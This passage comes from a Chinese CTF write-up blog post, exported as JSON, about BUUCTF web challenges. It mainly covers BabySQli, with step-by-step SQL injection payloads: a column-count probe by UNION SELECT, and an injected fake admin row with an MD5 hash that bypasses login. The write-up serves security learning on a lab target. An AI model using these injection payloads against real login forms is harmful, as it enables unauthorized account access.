alt=\"image-20220909204746167\"></p>\n<p>也可以得到解码结果</p>\n<hr>\n<p>由</p>\n<figure class=\"highlight n1ql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs n1ql\"><span class=\"hljs-keyword\">select</span> * <span class=\"hljs-keyword\">from</span> <span class=\"hljs-keyword\">user</span> <span class=\"hljs-keyword\">where</span> username = <span class=\"hljs-string\">&#x27;$name&#x27;</span><br></code></pre></td></tr></table></figure>\n\n<p>可知，sql注入点在Username处，且为单引号闭合</p>\n<p>于是我们尝构造注入</p>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs apache\"><span class=\"hljs-attribute\">name</span>=admin&#x27;%<span class=\"hljs-number\">20</span>and%<span class=\"hljs-number\">201</span>=<span class=\"hljs-number\">1</span>#&amp;pw=<span class=\"hljs-number\">123456</span><br></code></pre></td></tr></table></figure>\n\n<p><img src=\"/post/wp-buuctf/image-20220909205630033.png\" alt=\"image-20220909205630033\"></p>\n<p>发现有的字符被过滤了，我们可以用fuzz爆破测试看看，也可以一个一个试</p>\n<p>我这里先爆破试试（建议爆破还是慢一些，后面直接太多请求，服务器不发返回包了）</p>\n<p>大概统计一下</p>\n<figure class=\"highlight abnf\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs abnf\">or<br>()<br><span class=\"hljs-operator\">=</span><br></code></pre></td></tr></table></figure>\n\n<p>所以我们只有先试试联合注入</p>\n<figure class=\"highlight axapta\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs axapta\">由于过滤了or<br>所以我们不能使用<span class=\"hljs-keyword\">order</span> <span class=\"hljs-keyword\">by</span>来判断列数，可以用联合注入，利用<span class=\"hljs-keyword\">select</span>的结果来判断<br></code></pre></td></tr></table></figure>\n\n<p>先试试<code>select 1,2</code></p>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs apache\"><span class=\"hljs-attribute\">name</span>=admin&#x27;%<span class=\"hljs-number\">20</span>union%<span class=\"hljs-number\">20</span>select%<span class=\"hljs-number\">201</span>,<span class=\"hljs-number\">2</span>#&amp;pw=<span class=\"hljs-number\">123456</span><br></code></pre></td></tr></table></figure>\n\n<p><img src=\"/post/wp-buuctf/image-20220909214254664.png\" alt=\"image-20220909214254664\"></p>\n<p>发现报错，列数有问题</p>\n<p>再试试<code>select 1,2,3</code></p>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs apache\"><span class=\"hljs-attribute\">name</span>=admin&#x27;%<span class=\"hljs-number\">20</span>union%<span class=\"hljs-number\">20</span>select%<span class=\"hljs-number\">201</span>,<span class=\"hljs-number\">2</span>,<span class=\"hljs-number\">3</span>#&amp;pw=<span class=\"hljs-number\">123456</span><br></code></pre></td></tr></table></figure>\n\n<p><img src=\"/post/wp-buuctf/image-20220909214345515.png\" alt=\"image-20220909214345515\"></p>\n<p>发现虽然没有报错，但是也没有直接回显</p>\n<p>再试试<code>select 1,2,3,4</code></p>\n<p>又报错</p>\n<p><img src=\"/post/wp-buuctf/image-20220909214506605.png\" alt=\"image-20220909214506605\"></p>\n<p><strong>所以得出<code>列数一共有3列</code></strong></p>\n<p><strong>根据经验这三列，分别是</strong><u><strong>id,username,password</strong></u></p>\n<p>我们可以用以下语句进行确认</p>\n<figure class=\"highlight gauss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs gauss\">name=<span class=\"hljs-number\">-1</span>&#x27;%<span class=\"hljs-number\">20</span><span class=\"hljs-built_in\">union</span>%<span class=\"hljs-number\">20</span><span class=\"hljs-built_in\">select</span>%<span class=\"hljs-number\">20</span>”admin“,<span class=\"hljs-number\">2</span>,<span class=\"hljs-number\">3</span><span class=\"hljs-meta\">#&amp;pw=123456   </span><br><span class=\"hljs-comment\">//把第一位，即1的位置换成用户名admin</span><br></code></pre></td></tr></table></figure>\n\n<p><img src=\"/post/wp-buuctf/image-20220910085003536.png\" alt=\"image-20220910085003536\"></p>\n<p>提示用户名错误，看来用户名不在第一位</p>\n<figure class=\"highlight llvm\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs llvm\">name<span class=\"hljs-operator\">=</span><span class=\"hljs-number\">-1</span>&#x27;<span class=\"hljs-variable\">%20</span>union<span class=\"hljs-variable\">%20</span><span class=\"hljs-keyword\">select</span><span class=\"hljs-variable\">%201</span><span class=\"hljs-punctuation\">,</span><span class=\"hljs-string\">&quot;admin&quot;</span><span class=\"hljs-punctuation\">,</span><span class=\"hljs-number\">3</span>#&amp;pw<span class=\"hljs-operator\">=</span><span class=\"hljs-number\">123456</span><br>//把第二位，即<span class=\"hljs-number\">2</span>的位置换成用户名admin<br></code></pre></td></tr></table></figure>\n\n<p><img src=\"/post/wp-buuctf/image-20220910085115686.png\" alt=\"image-20220910085115686\"></p>\n<p>提示密码错误，看来用户名回显就在第二位</p>\n<p><strong>但是没有回显我们select的数据，可是如果用报错注入和盲注的话，()被过滤了，也不能用</strong></p>\n<p>所以我们只有考虑，怎么才可以登录上去</p>\n<p>首先这是一个sql注入的题目，密码不可能简单的爆破就可以解决</p>\n<p><strong>密码肯定是进行加密，最常见的密码加密就是md5</strong>，所以我们利用<code>md()</code>函数把我们的密码加密，再加上我们的用户名一起导入到题目的数据库里，即可完成登录</p>\n<p>注意因为<code>()</code>被过滤，所以只能先把密码进行md5加密，在导入，而不能直接用函数</p>\n<hr>\n<p>这里又有一个新的知识点</p>\n<p><strong>在联合查询并不存在的数据时，联合查询就会构造一个虚拟的数据。【union select】</strong></p>\n<p>在<code>Web-study</code>里写的详细</p>\n<p>下面简单说一下流程</p>\n<p>先把我们的密码123456利用md5加密</p>\n<p><img src=\"/post/wp-buuctf/image-20220910090640990.png\" alt=\"image-20220910090640990\"></p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs\">e10adc3949ba59abbe56e057f20f883e<br></code></pre></td></tr></table></figure>\n\n<p>然后构造payload</p>\n<figure class=\"highlight q\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs q\">name=<span class=\"hljs-number\">-1</span>&#x27;%<span class=\"hljs-number\">20</span><span class=\"hljs-built_in\">union</span>%<span class=\"hljs-number\">20</span><span class=\"hljs-keyword\">select</span>%<span class=\"hljs-number\">201</span>,<span class=\"hljs-string\">&quot;admin&quot;</span>,<span class=\"hljs-string\">&quot;e10adc3949ba59abbe56e057f20f883e&quot;</span>#&amp;pw=<span class=\"hljs-number\">123456</span><br><br>/*<br>联合注入的技巧，就是在使用<span class=\"hljs-built_in\">union</span> <span class=\"hljs-keyword\">select</span>时候，后面的数据如果不存在，就会生成一个虚拟的数据<br>如上面的<br><br>根据上面base编码结果，<span class=\"hljs-keyword\">select</span> * <span class=\"hljs-keyword\">from</span> user <span class=\"hljs-built_in\">where</span> username = &#x27;$name&#x27;<br><br>我们利用<span class=\"hljs-built_in\">union</span> <span class=\"hljs-keyword\">select</span> <span class=\"hljs-number\">1</span>,<span class=\"hljs-string\">&quot;admin&quot;</span>,<span class=\"hljs-string\">&quot;e10adc3949ba59abbe56e057f20f883e&quot;</span><br><br>因为user表里不存在id=<span class=\"hljs-number\">1</span>,username=admin,password=e10adc3949ba59abbe56e057f20f883e<br><br>所以会生成一个一个数据插入表中<br>*/<br>/*<br>当name参数进行sql注入，把数据插入user表中时<br>后面password只要和明文一样，即可登录成功<br>*/<br></code></pre></td></tr></table></figure>\n\n<p><img src=\"/post/wp-buuctf/image-20220910091405613.png\" alt=\"image-20220910091405613\"></p>\n<p>得到flag</p>\n<h2 id=\"13-护网杯-2018-easy-tornado\"><a href=\"#13-护网杯-2018-easy-tornado\" class=\"headerlink\" title=\"13.[护网杯 2018]easy_tornado\"></a>13.[护网杯 2018]easy_tornado</h2><h3 id=\"1-题目描述-10\"><a href=\"#1-题目描述-10\" class=\"headerlink\" title=\"1)题目描述\"></a>1)题目描述</h3><p>无</p>\n<h3 id=\"2-wp-10\"><a href=\"#2-wp-10\" class=\"headerlink\" title=\"2)wp\"></a>2)wp</h3>","text":"web各个方面选择了一些题目进行学习，感觉还是得第一次就应该看通彻，不应该留有问题，能够明白原理和代码中哪出造成这个的原因，反复嚼剩饭感觉浪费时间 Web1.[...","permalink":"/post/wp-buuctf","photos":[],"count_time":{"symbolsCount":"30k","symbolsTime":"27 mins."},"categories":[{"name":"网络安全学习","slug":"网络安全学习","count":26,"path":"api/categories/网络安全学习.json"}],"tags":[{"name":"靶场","slug":"靶场","count":5,"path":"api/tags/靶场.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#Web\"><span class=\"toc-text\">Web</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#1-%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8\"><span class=\"toc-text\">1.[强网杯 2019]随便注</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1%EF%BC%89%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0\"><span class=\"toc-text\">1）题目描述</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#2%EF%BC%89wp\"><span class=\"toc-text\">2）wp</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">堆叠注入</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF2%EF%BC%9A%E9%A2%84%E5%A4%84%E7%90%86%E7%BB%95%E8%BF%87select%E9%99%90%E5%88%B6\"><span class=\"toc-text\">解题思路2：预处理绕过select限制</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF3%EF%BC%9Ahandler%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">解题思路3：handler绕过</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#handler%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95\"><span class=\"toc-text\">handler基本用法</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E5%AE%9E%E4%BE%8B\"><span class=\"toc-text\">实例</span></a></li></ol></li></ol></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#2-GXYCTF2019-Ping-Ping-Ping\"><span class=\"toc-text\">2.[GXYCTF2019]Ping Ping Ping</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1-%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0\"><span class=\"toc-text\">1)题目描述</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#2-wp\"><span class=\"toc-text\">2)wp</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#3-MRCTF2020-%E4%BD%A0%E4%BC%A0%E4%BD%A0%F0%9F%90%8E%E5%91%A2\"><span class=\"toc-text\">3.[MRCTF2020]你传你🐎呢</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1-%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-1\"><span class=\"toc-text\">1)题目描述</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#2-wp-1\"><span class=\"toc-text\">2)wp</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#4-RoarCTF-2019-Easy-Calc\"><span class=\"toc-text\">4.[RoarCTF 2019]Easy Calc</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1-%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-2\"><span class=\"toc-text\">1)题目描述</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#2-wp-2\"><span class=\"toc-text\">2)wp</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#5-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-HardSQL\"><span class=\"toc-text\">5.[极客大挑战 2019]HardSQL</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1-%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-3\"><span class=\"toc-text\">1)题目描述</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#2-wp-3\"><span class=\"toc-text\">2)wp</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#6-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-AreUSerialz1\"><span class=\"toc-text\">6.[网鼎杯 2020 青龙组]AreUSerialz1</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#7-HCTF-2018-admin\"><span class=\"toc-text\">7.[HCTF 2018]admin</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1-%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-4\"><span class=\"toc-text\">1)题目描述</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#2-wp-4\"><span class=\"toc-text\">2)wp</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#8-ZJCTF-2019-NiZhuanSiWei\"><span class=\"toc-text\">8.[ZJCTF 2019]NiZhuanSiWei</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1-%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-5\"><span class=\"toc-text\">1)题目描述</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#2-wp-5\"><span class=\"toc-text\">2)wp</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#9-SUCTF-2019-CheckIn\"><span class=\"toc-text\">9.[SUCTF 2019]CheckIn</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1-%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-6\"><span class=\"toc-text\">1)题目描述</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#2-wp-6\"><span class=\"toc-text\">2)wp</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#10-GXYCTF2019-BabyUpload\"><span class=\"toc-text\">10.[GXYCTF2019]BabyUpload</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1-%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-7\"><span class=\"toc-text\">1)题目描述</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#2-wp-7\"><span class=\"toc-text\">2)wp</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#11-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME\"><span class=\"toc-text\">11.[极客大挑战 2019]RCE ME</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1-%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-8\"><span class=\"toc-text\">1)题目描述</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#2-wp-8\"><span class=\"toc-text\">2)wp</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#12-GXYCTF2019-BabySQli\"><span class=\"toc-text\">12.[GXYCTF2019]BabySQli</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1-%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-9\"><span class=\"toc-text\">1)题目描述</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#2-wp-9\"><span class=\"toc-text\">2)wp</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#13-%E6%8A%A4%E7%BD%91%E6%9D%AF-2018-easy-tornado\"><span class=\"toc-text\">13.[护网杯 2018]easy_tornado</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1-%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-10\"><span class=\"toc-text\">1)题目描述</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#2-wp-10\"><span class=\"toc-text\">2)wp</span></a></li></ol></li></ol></li></ol>","author":{"name":"Ttoc","slug":"blog-author","avatar":"/static/img/logo.png","link":"/","description":"必须从过去的错误学习教训，而非依赖过去的成功","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"hidden":false,"prev_post":{"title":"攻防世界靶场wp","uid":"c1355e18e08f584a9698a2879b69aeba","slug":"wp-Gongfang","date":"2022-06-21T14:06:24.391Z","updated":"2023-10-04T15:10:59.861Z","comments":true,"path":"api/articles/wp-Gongfang.json","keywords":null,"cover":"/img/34.jpg","text":"这个线上靶场感觉很适合入门，而且难度分布也好，很优秀的线上靶场，非常值得仔细学习研究一下 ...功防世界突然改版了，把题弄成一堆了，不过还是有难度系数，不过也方...","permalink":"/post/wp-Gongfang","photos":[],"count_time":{"symbolsCount":"30k","symbolsTime":"28 mins."},"categories":[{"name":"网络安全学习","slug":"网络安全学习","count":26,"path":"api/categories/网络安全学习.json"}],"tags":[{"name":"靶场","slug":"靶场","count":5,"path":"api/tags/靶场.json"}],"author":{"name":"Ttoc","slug":"blog-author","avatar":"/static/img/logo.png","link":"/","description":"必须从过去的错误学习教训，而非依赖过去的成功","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"web基础随记","uid":"8009cc0308ef2b434146ef92878679ee","slug":"Noteless","date":"2022-05-30T16:15:39.751Z","updated":"2023-10-04T13:21:45.987Z","comments":true,"path":"api/articles/Noteless.json","keywords":null,"cover":"/img/20.jpg","text":"随便记一下，大都常混淆或者易忘基础知识 网站连接重置，用清空缓存和Cookie解决今天在打buuctf靶场的时候遇到一个问题，就是当页面跳转时，会显示连接重置，...","permalink":"/post/Noteless","photos":[],"count_time":{"symbolsCount":"22k","symbolsTime":"20 mins."},"categories":[{"name":"web","slug":"web","count":2,"path":"api/categories/web.json"}],"tags":[{"name":"daily","slug":"daily","count":2,"path":"api/tags/daily.json"}],"author":{"name":"Ttoc","slug":"blog-author","avatar":"/static/img/logo.png","link":"/","description":"必须从过去的错误学习教训，而非依赖过去的成功","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}